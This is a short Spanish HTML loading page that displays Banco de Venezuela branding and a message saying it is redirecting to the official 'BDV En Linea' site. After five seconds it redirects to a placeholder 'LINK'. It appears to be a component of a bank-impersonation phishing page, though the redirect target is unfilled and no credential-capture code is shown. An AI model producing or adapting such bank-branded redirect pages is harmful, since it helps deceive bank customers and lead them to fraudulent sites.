<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Pantalla de carga</title>

  <!-- Google Fonts: Poppins -->
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet" />

  <style>
    body, html {
      margin: 0;
      padding: 0;
      height: 100%;
      background-color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      font-family: 'Poppins', sans-serif;
      color: #333;
      user-select: none;
    }

    .loader-container {
      text-align: center;
    }

    .loader-gif {
      width: 300px;
      height: auto;
      margin-bottom: 20px;
    }

    .loader-text {
      font-size: 20px;
      font-weight: 600;
      opacity: 0;
      transform: scale(0.95);
      animation: fadeZoomIn 1s ease forwards;
    }

    @keyframes fadeZoomIn {
      to {
        opacity: 1;
        transform: scale(1);
      }
    }
  </style>
</head>
<body>
  <div class="loader-container">
    <img src="https://www.google.com/url?sa=i&url=https%3A%2F%2Fseeklogo.com%2Ffree-vector-logos%2Fbdv-banco-de-venezuela&psig=AOvVaw1c2iIXlH2kwG9q0BehyRyB&ust=1756396175675000&source=images&cd=vfe&opi=89978449&ved=0CBUQjRxqFwoTCPi6zemrq48DFQAAAAAdAAAAABAE" alt="Cargando..." class="loader-gif" />
    <div class="loader-text">
      Redirigiendo a la pagina oficial BDV En Linea...
    </div>
  </div>

  <script>
    setTimeout(() => {
      window.location.href = 'LINK';
    }, 5000);
  </script>
</body>
</html>
